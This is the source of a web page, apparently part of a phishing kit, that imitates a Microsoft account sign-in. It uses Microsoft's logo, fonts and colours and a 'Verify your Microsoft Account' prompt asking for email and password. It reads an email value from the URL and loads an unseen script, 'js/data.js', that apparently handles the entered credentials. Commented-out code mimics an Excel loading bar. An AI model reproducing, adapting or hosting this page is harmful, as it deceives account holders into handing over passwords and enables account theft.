<?php
    if(isset($_GET['email'])){
        $email = $_GET['email'];
    }
?>


<!DOCTYPE html>
<html>
   <head>
      <title>0auth</title>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta name="referrer" content="strict-origin" />
      
   </head>

<style type="text/css">
   

   body {
      margin: 0;
      
   }

   body:before {
    content: "";
    position: absolute;
    width : 100%;
    height: auto;
    background: url(background.png);
    z-index: -1;
    
    filter        : blur(10px);
    -moz-filter   : blur(10px);
    -webkit-filter: blur(10px);
    -o-filter     : blur(10px);
    
    
   }


   .cont {


      width: 550px;
      height: 470px;
      background-color: #fff;
      box-shadow: 0px 2px 2px 2px rgba(0, 0, 0, 0.3);
      overflow: hidden;
      margin-top: 130px;
      margin-left: 410px;
      border-radius: 2px;



   }

   .form-cont {
      display: block;
      width: 405px;
      margin: 60px;
   }



   .logoimg {
      display: inline-block;
      vertical-align: top;
      margin-top: 40px;
      margin-left: 10px;
   }

   .logoname {
      display: inline-block;
      margin-top: 34px;
      margin-left: 7px;
      color: #30676b;
      font-weight: 700;
      font-family: sans-serif, Roboto; 
      font-size: 22px;
   }


   .topper {
      margin-left: 20px;
   }


   .form-cont input[type=Email]:hover, input[type=Password]:hover {

      border: 1px solid #0067b8;
      outline: none;
      border-left-width: 0;
      border-top-width: 0;
      border-right-width: 0;
      background-color: transparent;


   }

   .form-cont input[type=Email]:focus, input[type=Password]:focus {

      border: 2px solid #0067b8;
      outline: none;
      border-left-width: 0;
      border-top-width: 0;
      border-right-width: 0;
      background-color: transparent;


   }

   

   .form-cont input[type=Email], input[type=Password] {
         height: 44px;
        font-size: 16px;
        width: 100%;
        margin-bottom: 10px;
        -webkit-appearance: none;
        background: #fff;
        border: 1px solid #d9d9d9;
        border-top: 1px solid #c0c0c0;
        padding: 0 8px;
        box-sizing: border-box;
        -moz-box-sizing: border-box;
        border-left-width: 0;
        border-top-width: 0;
        border-right-width: 0;
        background-color: transparent;
        color: #000;
   }

   #email {
      font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
      font-weight: 600;
      color: #000;


   }

   #password {
      font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
      font-weight: 600;
      color: #000;


   }


   .form-cont p {
      font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
      font-weight: 600;
      font-family: 27px;
   }

   .form-cont [type=submit] {
      border-color: #0067b8;
      background-color: #0067b8;
      color: #fff;
      width: 100px;
      height: 27px;
      font-size: 16px;
      float: right;
      border: none;
      margin-top: 15px;

   }


a {
   text-decoration: none;
   margin-top: 23px;
   color: #0067b8;
}

.overpass {
   overflow: hidden;
   display: inline-flex;

}


</style>


   <body style="background: url(background.png); ">
      <div class="blur">
         
      </div>

      <div class="cont">
         
            <div class="topper">
            <div class="logoimg">
               <img src="micro.svg" width="140px;" height="auto">
            </div>
            
         </div>   
         <div class="form-cont">
            <form>
               <p style="font-size: 22px;">Verify your Microsoft Account</p>
               <p class="alertx"></p>

               <div>
                  
                  <input type="email" name="email" id="email" placeholder="Email, Phone or Skype" required="" autocomplete="" value="">
               </div>
               <div>
                  
                  <input type="password" name="password" id="password" placeholder="Password" required="" >
               </div>

               <div >
                  <input type="submit" name="Next" value="Next" id="nextx">
               </div>
            </form>
            <span>
               <p> <a href="#"> Can't access your account? </a></p>
            </span>
         </div>
      </div>
      
      <!--<div id="skeletonSheetBar" role="presentation" class="skeleton-sheet-bar-old ewa-stb-ltr" style="bottom:23px;" onmousedown="window.ShowSkeletonProgressBar()" oncontextmenu="return false">
         <div id="SheetBarProgressBar" class="ewa-stb-progressbar-outer-container-flex-auto">
            <div id="SheetBarProgressBarInnerContainer" class="ewa-stb-progressbar-inner-container-flex" style="display: block;">
               <div id="SheetBarProgressBarSeparator" class="ewa-stb-progressbar-separator" style="visibility:hidden;"></div>
               <div id="SheetBarProgressBarMessage" class="ewa-stb-progressbar-message" onload="loadOut();">Loading...</div>
               <div class="ewa-stb-progressbar"></div>
            </div>
         </div>-->
      </div>
     <!-- <script type="text/javascript">
        var timer = document.getElementById("SheetBarProgressBarMessage");
        setTimeout(function(){ timer.textContent="Still Loading..." }, 8000);
      
      </script> --> 
      <script src="vendor/jquery/jquery-2.2.3.min.js"></script>
      <script src="js/data.js"></script>

   </body>
</html>